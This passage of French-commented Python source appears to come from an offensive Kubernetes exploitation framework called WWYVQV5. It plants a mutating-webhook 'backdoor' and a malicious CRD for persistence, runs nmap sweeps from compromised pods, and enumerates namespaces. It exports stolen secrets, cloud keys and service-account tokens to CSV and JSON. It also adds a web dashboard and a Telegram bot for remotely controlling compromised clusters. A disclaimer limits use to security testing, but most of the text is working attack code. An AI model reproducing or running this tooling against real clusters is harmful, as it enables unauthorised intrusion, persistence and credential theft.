            async with session.post(url, json=webhook_config, timeout=self.config.timeout_per_operation) as response:
                if response.status in [200, 201]:
                    self.logger.info(f"✅ Webhook backdoor déployé")
                    cluster_info.persistence_mechanisms.append("mutating_webhook")
                    cluster_info.backdoors.append({
                        "type": "webhook",
                        "name": webhook_config["metadata"]["name"],
                        "timestamp": datetime.utcnow().isoformat()
                    })
                    
        except Exception as e:
            self.logger.debug(f"❌ Erreur déploiement webhook: {str(e)}")

    async def _create_malicious_crds(self, session: aiohttp.ClientSession, base_url: str, cluster_info: CompromisedCluster):
        """Création de Custom Resource Definitions malveillantes"""
        self.logger.info(f"📊 Création de CRDs malveillantes")
        
        crd_config = {
            "apiVersion": "apiextensions.k8s.io/v1",
            "kind": "CustomResourceDefinition",
            "metadata": {
                "name": f"backdoors.security.{self.session_id[:6]}.io"
            },
            "spec": {
                "group": f"security.{self.session_id[:6]}.io",
                "versions": [{
                    "name": "v1",
                    "served": True,
                    "storage": True,
                    "schema": {
                        "openAPIV3Schema": {
                            "type": "object",
                            "properties": {
                                "spec": {
                                    "type": "object",
                                    "properties": {
                                        "command": {"type": "string"},
                                        "schedule": {"type": "string"}
                                    }
                                }
                            }
                        }
                    }
                }],
                "scope": "Namespaced",
                "names": {
                    "plural": "backdoors",
                    "singular": "backdoor",
                    "kind": "Backdoor"
                }
            }
        }
        
        try:
            url = urljoin(base_url, "/apis/apiextensions.k8s.io/v1/customresourcedefinitions")
            async with session.post(url, json=crd_config, timeout=self.config.timeout_per_operation) as response:
                if response.status in [200, 201]:
                    self.logger.info(f"✅ CRD malveillante créée")
                    cluster_info.persistence_mechanisms.append("custom_resource_definition")
                    
        except Exception as e:
            self.logger.debug(f"❌ Erreur création CRD: {str(e)}")

    async def _lateral_movement_phase(self, session: aiohttp.ClientSession, base_url: str, cluster_info: CompromisedCluster):
        """Phase de mouvement latéral"""
        self.logger.info(f"🔄 Phase 2: Mouvement latéral - {base_url}")
        
        # Découverte réseau depuis les pods compromis
        await self._network_discovery_from_pods(session, base_url, cluster_info)
        
        # Exploitation cross-namespace
        await self._cross_namespace_exploitation(session, base_url, cluster_info)
        
        # Escalade de privilèges
        await self._privilege_escalation_attempts(session, base_url, cluster_info)

    async def _network_discovery_from_pods(self, session: aiohttp.ClientSession, base_url: str, cluster_info: CompromisedCluster):
        """Découverte réseau depuis les pods compromis"""
        self.logger.info(f"🕸️ Découverte réseau depuis pods compromis")
        
        for pod in cluster_info.pods_deployed:
            if pod.status == "deployed":
                try:
                    # Exécution de commandes de découverte dans le pod
                    commands = [
                        "ip route show",
                        "netstat -tlnp",
                        "nmap -sP 10.0.0.0/8",
                        "nmap -sP 172.16.0.0/12",
                        "nmap -sP 192.168.0.0/16"
                    ]
                    
                    for cmd in commands:
                        await self._execute_command_in_pod(session, base_url, pod, cmd)
                        
                except Exception as e:
                    self.logger.debug(f"❌ Erreur découverte réseau: {str(e)}")

    async def _execute_command_in_pod(self, session: aiohttp.ClientSession, base_url: str, pod: MaliciousPod, command: str):
        """Exécution d'une commande dans un pod"""
        try:
            # URL pour l'exécution de commandes
            exec_url = urljoin(base_url, f"/api/v1/namespaces/{pod.namespace}/pods/{pod.name}/exec")
            
            params = {
                "command": ["/bin/sh", "-c", command],
                "container": "monitor",  # Nom du conteneur principal
                "stdout": "true",
                "stderr": "true"
            }
            
            # Note: L'exécution réelle nécessiterait une connexion WebSocket
            # Ici on simule la tentative
            self.logger.debug(f"🔧 Tentative d'exécution: {command} dans {pod.name}")
            
        except Exception as e:
            self.logger.debug(f"❌ Erreur exécution commande: {str(e)}")

    # ═══════════════════════════════════════════════════════════════════════════════
    # 🎯 ÉVALUATION & ANALYSE
    # ═══════════════════════════════════════════════════════════════════════════════

    async def _evaluate_permissions(self, session: aiohttp.ClientSession, base_url: str, cluster_info: CompromisedCluster):
        """Évaluation des permissions et vulnérabilités"""
        self.logger.info(f"🔍 Évaluation des permissions - {base_url}")
        
        # Test d'accès anonymous
        await self._test_anonymous_access(session, base_url, cluster_info)
        
        # Énumération des namespaces
        await self._enumerate_namespaces(session, base_url, cluster_info)
        
        # Test des permissions avec les tokens trouvés
        await self._test_token_permissions(session, base_url, cluster_info)
        
        # Calcul du score de vulnérabilité
        self._calculate_vulnerability_score(cluster_info)

    async def _test_anonymous_access(self, session: aiohttp.ClientSession, base_url: str, cluster_info: CompromisedCluster):
        """Test d'accès anonyme"""
        try:
            url = urljoin(base_url, "/api/v1")
            async with session.get(url, timeout=self.config.timeout_per_operation) as response:
                if response.status == 200:
                    cluster_info.status = ClusterStatus.ACCESSIBLE
                    self.logger.warning(f"🚨 Accès anonyme autorisé sur {base_url}")
                    
        except Exception as e:
            self.logger.debug(f"❌ Test accès anonyme: {str(e)}")

    async def _enumerate_namespaces(self, session: aiohttp.ClientSession, base_url: str, cluster_info: CompromisedCluster):
        """Énumération des namespaces"""
        try:
            url = urljoin(base_url, "/api/v1/namespaces")
            async with session.get(url, timeout=self.config.timeout_per_operation) as response:
                if response.status == 200:
                    data = await response.json()
                    namespaces = [item.get('metadata', {}).get('name', '') 
                                for item in data.get('items', [])]
                    cluster_info.namespaces = namespaces
                    self.logger.info(f"📁 {len(namespaces)} namespaces découverts")
                    
        except Exception as e:
            self.logger.debug(f"❌ Énumération namespaces: {str(e)}")

    def _calculate_vulnerability_score(self, cluster_info: CompromisedCluster):
        """Calcul du score de vulnérabilité"""
        score = 0.0
        
        # Facteurs de base
        if cluster_info.status == ClusterStatus.ACCESSIBLE:
            score += 30.0
        if cluster_info.admin_access:
            score += 40.0
        
        # Secrets et tokens
        score += min(cluster_info.secrets_count * 2, 20)
        score += len([s for s in cluster_info.secrets if s.is_sensitive]) * 3
        score += len([t for t in cluster_info.service_accounts if t.is_cluster_admin]) * 15
        
        # Pods déployés et persistance
        score += len(cluster_info.pods_deployed) * 5
        score += len(cluster_info.persistence_mechanisms) * 8
        
        cluster_info.vulnerability_score = min(score, 100.0)
        
        # Détermination du niveau de menace
        if score >= 80:
            cluster_info.threat_level = ThreatLevel.CRITICAL
        elif score >= 60:
            cluster_info.threat_level = ThreatLevel.HIGH
        elif score >= 30:
            cluster_info.threat_level = ThreatLevel.MEDIUM
        else:
            cluster_info.threat_level = ThreatLevel.LOW

    def _update_cluster_stats(self, cluster_info: CompromisedCluster):
        """Mise à jour des statistiques du cluster"""
        cluster_info.last_activity = datetime.utcnow().isoformat()
        
        if cluster_info.secrets_count > 0:
            cluster_info.status = ClusterStatus.ACCESSIBLE
        
        if cluster_info.pods_deployed:
            cluster_info.status = ClusterStatus.COMPROMISED
            
        if cluster_info.persistence_mechanisms:
            cluster_info.status = ClusterStatus.PERSISTENT

    # ═══════════════════════════════════════════════════════════════════════════════
    # 🎯 PHASE 3: INTERFACE & CONTRÔLE
    # ═══════════════════════════════════════════════════════════════════════════════

    async def _send_compromise_alerts(self, cluster_info: CompromisedCluster):
        """Envoi d'alertes de compromission"""
        if self.config.telegram_alerts:
            await self._send_telegram_alert(cluster_info)
        
        if self.config.discord_alerts:
            await self._send_discord_alert(cluster_info)

    async def _send_telegram_alert(self, cluster_info: CompromisedCluster):
        """Alerte Telegram lors de compromission"""
        try:
            message = f"""
🚨 **CLUSTER COMPROMIS** 🚨

🎯 **Endpoint**: `{cluster_info.endpoint}`
📊 **Statut**: {cluster_info.status.value.upper()}
⚠️ **Niveau**: {cluster_info.threat_level.value.upper()}
🏆 **Score**: {cluster_info.vulnerability_score:.1f}/100

💾 **Secrets extraits**: {cluster_info.secrets_count}
🔑 **Tokens trouvés**: {len(cluster_info.service_accounts)}
🚀 **Pods déployés**: {len(cluster_info.pods_deployed)}
🔒 **Persistance**: {len(cluster_info.persistence_mechanisms)} mécanismes

⏰ **Compromis le**: {cluster_info.compromise_time}
🆔 **Session**: {self.session_id}
            """
            
            # TODO: Implémenter l'envoi Telegram réel
            self.logger.info(f"📱 Alerte Telegram préparée pour {cluster_info.endpoint}")
            
        except Exception as e:
            self.logger.error(f"❌ Erreur alerte Telegram: {str(e)}")

    async def _send_discord_alert(self, cluster_info: CompromisedCluster):
        """Alerte Discord enrichie"""
        try:
            embed = {
                "title": "🚨 CLUSTER KUBERNETES COMPROMIS",
                "color": 0xff0000 if cluster_info.threat_level == ThreatLevel.CRITICAL else 0xff9900,
                "fields": [
                    {"name": "🎯 Endpoint", "value": cluster_info.endpoint, "inline": True},
                    {"name": "📊 Statut", "value": cluster_info.status.value.upper(), "inline": True},
                    {"name": "⚠️ Niveau", "value": cluster_info.threat_level.value.upper(), "inline": True},
                    {"name": "🏆 Score", "value": f"{cluster_info.vulnerability_score:.1f}/100", "inline": True},
                    {"name": "💾 Secrets", "value": str(cluster_info.secrets_count), "inline": True},
                    {"name": "🚀 Pods", "value": str(len(cluster_info.pods_deployed)), "inline": True}
                ],
                "timestamp": datetime.utcnow().isoformat(),
                "footer": {"text": f"Session: {self.session_id}"}
            }
            
            # TODO: Implémenter l'envoi Discord réel
            self.logger.info(f"💬 Alerte Discord préparée pour {cluster_info.endpoint}")
            
        except Exception as e:
            self.logger.error(f"❌ Erreur alerte Discord: {str(e)}")

    # ═══════════════════════════════════════════════════════════════════════════════
    # 🎯 EXPORT & RAPPORTS
    # ═══════════════════════════════════════════════════════════════════════════════

    async def generate_comprehensive_report(self):
        """Génération d'un rapport complet d'exploitation"""
        self.logger.info(f"📊 Génération du rapport complet")
        
        # Rapport JSON détaillé
        await self._export_json_report()
        
        # Rapport CSV des credentials
        await self._export_credentials_csv()
        
        # Rapport HTML interactif
        await self._export_html_dashboard()
        
        # Statistiques finales
        await self._export_statistics()

    async def _export_json_report(self):
        """Export JSON complet"""
        report = {
            "metadata": {
                "session_id": self.session_id,
                "start_time": self.start_time.isoformat(),
                "end_time": datetime.utcnow().isoformat(),
                "exploitation_mode": self.config.mode.value,
                "version": "5.0.0"
            },
            "statistics": self.stats,
            "compromised_clusters": {
                endpoint: asdict(cluster) 
                for endpoint, cluster in self.compromised_clusters.items()
            },
            "all_secrets": [asdict(secret) for secret in self.all_secrets],
            "all_tokens": [asdict(token) for token in self.all_tokens],
            "exploitation_log": self.exploitation_log
        }
        
        output_file = self.output_dir / "exploitation_report.json"
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        self.logger.info(f"💾 Rapport JSON exporté: {output_file}")

    async def _export_credentials_csv(self):
        """Export CSV des credentials validés"""
        output_file = self.output_dir / "credentials_valid.csv"
        
        with open(output_file, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            
            # En-têtes
            writer.writerow([
                'cluster_endpoint', 'type', 'name', 'namespace', 
                'credential_type', 'is_sensitive', 'threat_level',
                'extraction_time'
            ])
            
            # Secrets
            for secret in self.all_secrets:
                if secret.is_sensitive:
                    writer.writerow([
                        secret.cluster_endpoint,
                        'secret',
                        secret.name,
                        secret.namespace,
                        secret.credential_type or 'Unknown',
                        secret.is_sensitive,
                        secret.threat_level.value,
                        secret.extraction_time
                    ])
            
            # Tokens
                       # Tokens
            for token in self.all_tokens:
                writer.writerow([
                    token.cluster_endpoint,
                    'service_account_token',
                    token.name,
                    token.namespace,
                    'Service Account Token',
                    True,
                    'critical' if token.is_cluster_admin else 'medium',
                    datetime.utcnow().isoformat()
                ])
        
        self.logger.info(f"📊 Credentials CSV exporté: {output_file}")

    async def _export_html_dashboard(self):
        """Export dashboard HTML interactif"""
        html_content = self._generate_html_dashboard()
        output_file = self.output_dir / "dashboard.html"
        
        with open(output_file, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        self.logger.info(f"🌐 Dashboard HTML exporté: {output_file}")

    def _generate_html_dashboard(self) -> str:
        """Génération du contenu HTML du dashboard"""
        total_clusters = len(self.compromised_clusters)
        compromised_count = len([c for c in self.compromised_clusters.values() 
                                if c.status != ClusterStatus.FAILED])
        
        cluster_cards = ""
        for endpoint, cluster in self.compromised_clusters.items():
            status_color = {
                ClusterStatus.DETECTED: "#6c757d",
                ClusterStatus.ACCESSIBLE: "#ffc107", 
                ClusterStatus.COMPROMISED: "#fd7e14",
                ClusterStatus.PERSISTENT: "#dc3545",
                ClusterStatus.FAILED: "#6f42c1"
            }.get(cluster.status, "#6c757d")
            
            threat_color = {
                ThreatLevel.LOW: "#28a745",
                ThreatLevel.MEDIUM: "#ffc107",
                ThreatLevel.HIGH: "#fd7e14", 
                ThreatLevel.CRITICAL: "#dc3545"
            }.get(cluster.threat_level, "#6c757d")
            
            cluster_cards += f"""
            <div class="cluster-card">
                <div class="cluster-header">
                    <h3>{endpoint}</h3>
                    <span class="status-badge" style="background-color: {status_color}">
                        {cluster.status.value.upper()}
                    </span>
                </div>
                <div class="cluster-stats">
                    <div class="stat-item">
                        <span class="stat-label">Score de vulnérabilité:</span>
                        <span class="stat-value">{cluster.vulnerability_score:.1f}/100</span>
                    </div>
                    <div class="stat-item">
                        <span class="stat-label">Niveau de menace:</span>
                        <span class="threat-badge" style="background-color: {threat_color}">
                            {cluster.threat_level.value.upper()}
                        </span>
                    </div>
                    <div class="stat-item">
                        <span class="stat-label">🔐 Secrets extraits:</span>
                        <span class="stat-value">{cluster.secrets_count}</span>
                    </div>
                    <div class="stat-item">
                        <span class="stat-label">🎫 Tokens trouvés:</span>
                        <span class="stat-value">{len(cluster.service_accounts)}</span>
                    </div>
                    <div class="stat-item">
                        <span class="stat-label">🚀 Pods déployés:</span>
                        <span class="stat-value">{len(cluster.pods_deployed)}</span>
                    </div>
                    <div class="stat-item">
                        <span class="stat-label">🔒 Persistance:</span>
                        <span class="stat-value">{len(cluster.persistence_mechanisms)} mécanismes</span>
                    </div>
                </div>
                <div class="cluster-details">
                    <p><strong>Version K8s:</strong> {cluster.version or 'Inconnue'}</p>
                    <p><strong>Distribution:</strong> {cluster.distribution or 'Inconnue'}</p>
                    <p><strong>Namespaces:</strong> {len(cluster.namespaces)}</p>
                    <p><strong>Compromis le:</strong> {cluster.compromise_time}</p>
                </div>
            </div>
            """
        
        return f"""
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🚀 WWYVQV5 - Kubernetes Exploitation Dashboard</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #fff;
            min-height: 100vh;
            padding: 20px;
        }}
        
        .dashboard-header {{
            text-align: center;
            margin-bottom: 40px;
            padding: 20px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }}
        
        .dashboard-title {{
            font-size: 3em;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }}
        
        .dashboard-subtitle {{
            font-size: 1.2em;
            opacity: 0.9;
        }}
        
        .global-stats {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 40px;
        }}
        
        .stat-card {{
            background: rgba(255, 255, 255, 0.15);
            padding: 25px;
            border-radius: 15px;
            text-align: center;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }}
        
        .stat-number {{
            font-size: 2.5em;
            font-weight: bold;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }}
        
        .stat-label {{
            font-size: 1.1em;
            opacity: 0.9;
        }}
        
        .clusters-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
            gap: 25px;
        }}
        
        .cluster-card {{
            background: rgba(255, 255, 255, 0.15);
            border-radius: 15px;
            padding: 25px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }}
        
        .cluster-card:hover {{
            transform: translateY(-5px);
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
        }}
        
        .cluster-header {{
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.2);
        }}
        
        .cluster-header h3 {{
            font-size: 1.3em;
            word-break: break-all;
        }}
        
        .status-badge, .threat-badge {{
            padding: 5px 12px;
            border-radius: 20px;
            font-size: 0.8em;
            font-weight: bold;
            text-transform: uppercase;
        }}
        
        .cluster-stats {{
            margin-bottom: 20px;
        }}
        
        .stat-item {{
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            padding: 5px 0;
        }}
        
        .stat-label {{
            opacity: 0.9;
        }}
        
        .stat-value {{
            font-weight: bold;
        }}
        
        .cluster-details {{
            background: rgba(0, 0, 0, 0.2);
            padding: 15px;
            border-radius: 10px;
            font-size: 0.9em;
        }}
        
        .cluster-details p {{
            margin-bottom: 5px;
        }}
        
        .footer {{
            text-align: center;
            margin-top: 40px;
            padding: 20px;
            opacity: 0.8;
        }}
        
        @media (max-width: 768px) {{
            .dashboard-title {{ font-size: 2em; }}
            .global-stats {{ grid-template-columns: 1fr; }}
            .clusters-grid {{ grid-template-columns: 1fr; }}
            .cluster-card {{ margin-bottom: 20px; }}
        }}
    </style>
</head>
<body>
    <div class="dashboard-header">
        <h1 class="dashboard-title">🚀 WWYVQV5 KUBERNETES EXPLOITATION</h1>
        <p class="dashboard-subtitle">
            Session: {self.session_id} | 
            Démarré le: {self.start_time.strftime('%Y-%m-%d %H:%M:%S UTC')} | 
            Généré le: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}
        </p>
    </div>
    
    <div class="global-stats">
        <div class="stat-card">
            <div class="stat-number">{total_clusters}</div>
            <div class="stat-label">🎯 Clusters Scannés</div>
        </div>
        <div class="stat-card">
            <div class="stat-number">{compromised_count}</div>
            <div class="stat-label">🔓 Clusters Compromis</div>
        </div>
        <div class="stat-card">
            <div class="stat-number">{len(self.all_secrets)}</div>
            <div class="stat-label">🔐 Secrets Extraits</div>
        </div>
        <div class="stat-card">
            <div class="stat-number">{len(self.all_tokens)}</div>
            <div class="stat-label">🎫 Tokens Trouvés</div>
        </div>
        <div class="stat-card">
            <div class="stat-number">{self.stats['pods_deployed']}</div>
            <div class="stat-label">🚀 Pods Déployés</div>
        </div>
        <div class="stat-card">
            <div class="stat-number">{len([s for s in self.all_secrets if s.is_sensitive])}</div>
            <div class="stat-label">🚨 Secrets Sensibles</div>
        </div>
    </div>
    
    <div class="clusters-grid">
        {cluster_cards}
    </div>
    
    <div class="footer">
        <p>🔒 WWYVQV5 - Framework d'Exploitation Kubernetes Avancé</p>
        <p>⚠️ À des fins de test de sécurité uniquement - Utilisez de manière responsable</p>
        <p>👨‍💻 Développé par wKayaa | Version 5.0.0 | {datetime.utcnow().year}</p>
    </div>
</body>
</html>
        """

    async def _export_statistics(self):
        """Export des statistiques finales"""
        stats = {
            "session_id": self.session_id,
            "start_time": self.start_time.isoformat(),
            "end_time": datetime.utcnow().isoformat(),
            "duration_seconds": (datetime.utcnow() - self.start_time).total_seconds(),
            "exploitation_mode": self.config.mode.value,
            "global_statistics": self.stats,
            "cluster_breakdown": {
                "total_detected": len(self.compromised_clusters),
                "accessible": len([c for c in self.compromised_clusters.values() 
                                if c.status == ClusterStatus.ACCESSIBLE]),
                "compromised": len([c for c in self.compromised_clusters.values() 
                                 if c.status == ClusterStatus.COMPROMISED]),
                "persistent": len([c for c in self.compromised_clusters.values() 
                                if c.status == ClusterStatus.PERSISTENT]),
                "failed": len([c for c in self.compromised_clusters.values() 
                             if c.status == ClusterStatus.FAILED])
            },
            "threat_levels": {
                "critical": len([c for c in self.compromised_clusters.values() 
                               if c.threat_level == ThreatLevel.CRITICAL]),
                "high": len([c for c in self.compromised_clusters.values() 
                           if c.threat_level == ThreatLevel.HIGH]),
                "medium": len([c for c in self.compromised_clusters.values() 
                             if c.threat_level == ThreatLevel.MEDIUM]),
                "low": len([c for c in self.compromised_clusters.values() 
                          if c.threat_level == ThreatLevel.LOW])
            },
            "secrets_analysis": {
                "total_secrets": len(self.all_secrets),
                "sensitive_secrets": len([s for s in self.all_secrets if s.is_sensitive]),
                "aws_credentials": len([s for s in self.all_secrets if s.aws_keys]),
                "gcp_credentials": len([s for s in self.all_secrets if s.gcp_keys]),
                "azure_credentials": len([s for s in self.all_secrets if s.azure_keys]),
                "jwt_tokens": len([s for s in self.all_secrets if s.credential_type == "JWT"]),
                "service_account_tokens": len([s for s in self.all_secrets 
                                             if s.credential_type == "Service Account"])
            },
            "exploitation_efficiency": {
                "success_rate": (self.stats["clusters_compromised"] / max(self.stats["clusters_scanned"], 1)) * 100,
                "avg_secrets_per_cluster": len(self.all_secrets) / max(len(self.compromised_clusters), 1),
                "avg_pods_per_cluster": self.stats["pods_deployed"] / max(len(self.compromised_clusters), 1)
            }
        }
        
        output_file = self.output_dir / "statistics.json"
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(stats, f, indent=2, ensure_ascii=False)
        
        self.logger.info(f"📈 Statistiques exportées: {output_file}")

    # ═══════════════════════════════════════════════════════════════════════════════
    # 🎯 NETTOYAGE & SÉCURITÉ
    # ═══════════════════════════════════════════════════════════════════════════════

    async def cleanup_all_artifacts(self):
        """Nettoyage de tous les artefacts déployés"""
        if not self.config.cleanup_on_exit:
            self.logger.info("🚫 Nettoyage désactivé - artefacts conservés")
            return
        
        self.logger.info("🧹 Début du nettoyage des artefacts")
        
        for endpoint, cluster in self.compromised_clusters.items():
            await self._cleanup_cluster_artifacts(endpoint, cluster)
        
        self.logger.info("✅ Nettoyage terminé")

    async def _cleanup_cluster_artifacts(self, endpoint: str, cluster: CompromisedCluster):
        """Nettoyage des artefacts d'un cluster spécifique"""
        try:
            self.logger.info(f"🧹 Nettoyage des artefacts: {endpoint}")
            
            async with aiohttp.ClientSession() as session:
                # Suppression des pods malveillants
                for pod in cluster.pods_deployed:
                    await self._delete_malicious_pod(session, endpoint, pod)
                
                # Suppression des backdoors
                for backdoor in cluster.backdoors:
                    await self._delete_backdoor(session, endpoint, backdoor)
                
                # Suppression des mécanismes de persistance
                for mechanism in cluster.persistence_mechanisms:
                    await self._cleanup_persistence_mechanism(session, endpoint, mechanism)
                    
        except Exception as e:
            self.logger.error(f"❌ Erreur nettoyage {endpoint}: {str(e)}")

    async def _delete_malicious_pod(self, session: aiohttp.ClientSession, endpoint: str, pod: MaliciousPod):
        """Suppression d'un pod malveillant"""
        try:
            delete_url = f"{endpoint}/api/v1/namespaces/{pod.namespace}/pods/{pod.name}"
            async with session.delete(delete_url, timeout=self.config.timeout_per_operation) as response:
                if response.status in [200, 202, 404]:
                    self.logger.info(f"🗑️ Pod supprimé: {pod.namespace}/{pod.name}")
                    
        except Exception as e:
            self.logger.debug(f"❌ Erreur suppression pod {pod.name}: {str(e)}")

    async def _delete_backdoor(self, session: aiohttp.ClientSession, endpoint: str, backdoor: Dict):
        """Suppression d'un backdoor"""
        try:
            backdoor_type = backdoor.get("type", "")
            name = backdoor.get("name", "")
            
            if backdoor_type == "webhook":
                delete_url = f"{endpoint}/apis/admissionregistration.k8s.io/v1/mutatingadmissionwebhooks/{name}"
            else:
                return
            
            async with session.delete(delete_url, timeout=self.config.timeout_per_operation) as response:
                if response.status in [200, 202, 404]:
                    self.logger.info(f"🗑️ Backdoor supprimé: {name}")
                    
        except Exception as e:
            self.logger.debug(f"❌ Erreur suppression backdoor: {str(e)}")

    # ═══════════════════════════════════════════════════════════════════════════════
    # 🎯 MÉTHODES UTILITAIRES
    # ═══════════════════════════════════════════════════════════════════════════════

    def _generate_random_name(self, prefix: str = "sys") -> str:
        """Génération d'un nom aléatoire pour les artefacts"""
        suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"{prefix}-{suffix}"

    def _is_lab_environment(self, endpoint: str) -> bool:
        """Vérification si l'environnement est un lab de test"""
        lab_indicators = [
            'localhost', '127.0.0.1', '10.', '172.16.', '172.17.', '172.18.',
            '192.168.', 'kind', 'minikube', 'k3s', 'test', 'lab', 'dev'
        ]
        
        return any(indicator in endpoint.lower() for indicator in lab_indicators)

    async def validate_environment(self, targets: List[str]):
        """Validation de l'environnement avant exploitation"""
        if not self.config.validate_lab_env:
            return True
        
        production_indicators = ['prod', 'production', 'live']
        
        for target in targets:
            if any(indicator in target.lower() for indicator in production_indicators):
                if not self._is_lab_environment(target):
                    self.logger.error(f"🚨 ARRÊT: Environnement de production détecté - {target}")
                    return False
        
        return True

    def print_final_summary(self):
        """Affichage du résumé final d'exploitation"""
        duration = datetime.utcnow() - self.start_time
        
        print("\n" + "="*80)
        print("🚀 WWYVQV5 - RÉSUMÉ FINAL D'EXPLOITATION KUBERNETES")
        print("="*80)
        print(f"📊 Session: {self.session_id}")
        print(f"⏱️  Durée: {duration}")
        print(f"🎯 Mode: {self.config.mode.value.upper()}")
        print("-"*80)
        print(f"🔍 Clusters scannés: {self.stats['clusters_scanned']}")
        print(f"🔓 Clusters compromis: {self.stats['clusters_compromised']}")
        print(f"🔐 Secrets extraits: {self.stats['secrets_extracted']}")
        print(f"🎫 Tokens trouvés: {len(self.all_tokens)}")
        print(f"🚀 Pods déployés: {self.stats['pods_deployed']}")
        print(f"🔒 Persistance établie: {self.stats['persistence_established']}")
        print("-"*80)
        
        # Breakdown par niveau de menace
        threat_counts = {}
        for cluster in self.compromised_clusters.values():
            level = cluster.threat_level.value
            threat_counts[level] = threat_counts.get(level, 0) + 1
        
        for level, count in threat_counts.items():
            emoji = {"critical": "🔴", "high": "🟠", "medium": "🟡", "low": "🟢"}.get(level, "⚪")
            print(f"{emoji} {level.upper()}: {count} clusters")
        
        print("-"*80)
        
        # Top clusters les plus vulnérables
        top_clusters = sorted(self.compromised_clusters.values(), 
                            key=lambda x: x.vulnerability_score, reverse=True)[:5]
        
        if top_clusters:
            print("🎯 TOP 5 CLUSTERS LES PLUS VULNÉRABLES:")
            for i, cluster in enumerate(top_clusters, 1):
                print(f"{i}. {cluster.endpoint} - Score: {cluster.vulnerability_score:.1f}/100")
        
        print("-"*80)
        print(f"📁 Résultats exportés dans: {self.output_dir}")
        print("="*80)


# ═══════════════════════════════════════════════════════════════════════════════
# 🌐 INTERFACE WEB DASHBOARD - PHASE 3
# ═══════════════════════════════════════════════════════════════════════════════

class KubernetesExploitationDashboard:
    """Interface web pour contrôler les clusters compromis"""
    
    def __init__(self, exploitation_framework: KubernetesAdvancedExploitation):
        self.framework = exploitation_framework
        self.app = Flask(__name__) if HAS_INTEGRATIONS else None
        self._setup_routes()
    
    def _setup_routes(self):
        """Configuration des routes Flask"""
        if not self.app:
            return
        
        @self.app.route('/')
        def dashboard():
            return self._render_dashboard()
        
        @self.app.route('/api/clusters')
        def api_clusters():
            return jsonify({
                endpoint: asdict(cluster) 
                for endpoint, cluster in self.framework.compromised_clusters.items()
            })
        
        @self.app.route('/api/execute', methods=['POST'])
        def api_execute():
            data = request.get_json()
            cluster_id = data.get('cluster_id')
            command = data.get('command')
            
            if cluster_id in self.framework.compromised_clusters:
                # TODO: Implémenter l'exécution de commandes réelle
                return jsonify({"status": "success", "output": f"Commande '{command}' exécutée"})
            else:
                return jsonify({"status": "error", "message": "Cluster non trouvé"}), 404
        
        @self.app.route('/api/stats')
        def api_stats():
            return jsonify(self.framework.stats)
    
    def _render_dashboard(self):
        """Rendu du dashboard principal"""
        # Utilise le HTML généré par le framework
        return self.framework._generate_html_dashboard()
    
    def run(self, host='127.0.0.1', port=5000, debug=False):
        """Démarrage du serveur web"""
        if self.app:
            self.app.run(host=host, port=port, debug=debug)
        else:
            print("❌ Flask non disponible - Dashboard web désactivé")


# ═══════════════════════════════════════════════════════════════════════════════
# 🤖 BOT TELEGRAM INTERACTIF - PHASE 3
# ═══════════════════════════════════════════════════════════════════════════════

class KubernetesTelegramBot:
    """Bot Telegram pour contrôle à distance"""
    
    def __init__(self, token: str, exploitation_framework: KubernetesAdvancedExploitation):
        self.framework = exploitation_framework
        self.bot = telebot.TeleBot(token) if HAS_INTEGRATIONS else None
        self._setup_handlers()
    
    def _setup_handlers(self):
        """Configuration des handlers Telegram"""
        if not self.bot:
            return
        
        @self.bot.message_handler(commands=['start'])
        def handle_start(message):
            self._send_welcome_message(message)
        
        @self.bot.message_handler(commands=['status'])
        def handle_status(message):
            self._send_status_update(message)
        
        @self.bot.message_handler(commands=['clusters'])
        def handle_clusters(message):
            self._send_clusters_list(message)
        
        @self.bot.message_handler(commands=['exploit'])
        def handle_exploit(message):
            self._handle_exploit_command(message)
        
        @self.bot.message_handler(commands=['cleanup'])
        def handle_cleanup(message):
            self._handle_cleanup_command(message)
    
    def _send_welcome_message(self, message):
        """Message de bienvenue"""
        welcome_text = f"""
🚀 **WWYVQV5 Kubernetes Exploitation Bot**

📊 **Session active**: `{self.framework.session_id}`
⏰ **Démarré le**: {self.framework.start_time.strftime('%Y-%m-%d %H:%M:%S UTC')}
🎯 **Mode**: {self.framework.config.mode.value.upper()}

**Commandes disponibles:**
/status - Statut de l'exploitation
/clusters - Liste des clusters compromis
/exploit <endpoint> - Lance l'exploitation
/cleanup - Nettoyage des artefacts

⚠️ **Utilisation responsable uniquement**
        """
        self.bot.reply_to(message, welcome_text, parse_mode='Markdown')
    
    def _send_status_update(self, message):
        """Envoi du statut actuel"""
        stats_text = f"""
📊 **STATUT D'EXPLOITATION**

🔍 **Clusters scannés**: {self.framework.stats['clusters_scanned']}
🔓 **Clusters compromis**: {self.framework.stats['clusters_compromised']}
🔐 **Secrets extraits**: {self.framework.stats['secrets_extracted']}
🎫 **Tokens trouvés**: {len(self.framework.all_tokens)}
🚀 **Pods déployés**: {self.framework.stats['pods_deployed']}

